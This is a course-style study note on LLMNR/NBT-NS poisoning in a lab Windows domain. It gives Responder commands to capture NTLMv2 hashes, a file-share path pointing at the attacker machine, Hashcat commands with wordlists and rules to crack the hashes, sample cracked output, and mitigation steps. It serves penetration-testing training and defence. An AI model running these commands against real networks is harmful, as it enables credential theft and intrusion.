---

# 🕵️‍♂️ Catching Credentials: LLMNR Poisoning Exploit

---

## 📝 **Summary**

LLMNR (Link-Local Multicast Name Resolution) is used when DNS fails to resolve hostnames, making it vulnerable to poisoning attacks. The attack involves using tools like Responder to capture NTLMv2 hashes from network traffic. Once captured, these hashes can be cracked using Hashcat. The main defense is to disable LLMNR/NBT-NS or enforce strong password policies and network controls.

---

## 🛠️ **Detailed Notes**

### **LLMNR Poisoning Steps**

1. **Run Responder**:
    - **Objective**: Capture LLMNR and NBT-NS requests on the network.
    - **Command**:
        
        ```bash
        sudo responder -I tun0 -dwp
        
        ```
        
    - **Context**: Run Responder during high-traffic times, like mornings or after lunch, when users are logging in or accessing resources. Responder listens for traffic and captures hashes when it detects LLMNR or NBT-NS requests.
2. **Simulate Traffic**:
    - **Objective**: Trigger LLMNR requests by accessing a file share pointing to the attacker’s IP.
    - **Setup**: In the lab environment, use two Windows machines (SPIDERMAN and PUNISHER) connected to the domain controller (MARVEL).
    - **Action**: From the PUNISHER machine, access a file share pointing to the attacker's IP (192.168.164.128):
        
        ```bash
        \\\\192.168.164.128
        
        ```
        
3. **Capture Hashes with Responder**:
    - **Objective**: Capture NTLMv2 hashes when the file share request is made.
    - **Ensure** you are on the same subnet by checking your IP:
        
        ```bash
        ip a
        
        ```
        
    - **Run Responder** on the attacker's machine:
        
        ```bash
        sudo responder -I eth0 -wPv
        
        ```
        
    - **Output Example**:
        
        ```
        [SMB] NTLMv2-SSP Username : MARVEL\\fcastle
        [SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:6608abd7ff...
        
        ```
        
4. **Cracking Captured Hashes**:
    - **Objective**: Use Hashcat to crack the NTLMv2 hash.
    - **Prepare**: Create a directory and save the captured hashes in a file (hashes.txt).
    - **Command to crack**:
        
        ```bash
        hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --show
        
        ```
        
    - **Example Output**:
        
        ```
        FCASTLE::MARVEL:7623ad517de05459:Password1
        
        ```
        
    - **Note**: Hashcat uses CPU by default. Running it on a VM can be slow. For faster results, use GPU-accelerated cracking.
5. **Advanced Hash Cracking Options**:
    - If Hashcat struggles on a VM, try running it with `-force`:
        
        ```bash
        hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --force
        
        ```
        
    - You can also apply rules to modify the wordlist and try more complex passwords:
        
        ```bash
        hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r OneRule
        
        ```
        

### **LLMNR Mitigation**

- **Disable LLMNR**:
    - Path: `Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client`
    - Enable "Turn OFF Multicast Name Resolution."
- **Disable NBT-NS**:
    - Path: `Network Connections > Adapter Properties > TCP/IPv4 > Advanced > WINS tab`
    - Select "Disable NetBIOS over TCP/IP."
- **If LLMNR/NBT-NS cannot be disabled**:
    - Implement **Network Access Control**.
    - Enforce **strong passwords** (e.g., >14 characters).

---

## 🔠 **Abbreviations & Definitions**

- **LLMNR**: Link-Local Multicast Name Resolution, a protocol for hostname resolution when DNS fails.
- **NBT-NS**: NetBIOS Name Service, an older method for resolving hostnames.
- **NTLMv2**: New Technology LAN Manager version 2, a suite of security protocols for authentication.
- **SMB**: Server Message Block, a network protocol for file sharing and communication.

---

## 🚨 **Critical Mentions & Exam Traps**

- **🚨 Responder should be run during times of high traffic** to maximize the chance of capturing LLMNR requests.
- **🚨 LLMNR/NBT-NS is often enabled by default on many networks**, so always check if it's active when targeting a network.
- **💡 NTLMv2 hashes change every time they’re captured**, but Hashcat’s pot file stores previously cracked hashes for faster future cracks.
- **💡 Password strength is key**—stronger passwords reduce the likelihood of cracking captured hashes, so expect password complexity to be a common countermeasure.
- **🚨 For real-world applications, explore advanced wordlists and rules** for hash cracking. Rockyou.txt is a good baseline but may not be sufficient in professional environments.

---

### 💡 **Tips for Faster Hash Cracking**

- **Use GPU**: Running Hashcat on a GPU-enabled machine significantly increases the speed of cracking.
- **Use Optimized Mode**: Add `O` to Hashcat commands for optimized cracking speeds:
    
    ```bash
    hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -O
    
    ```
    

---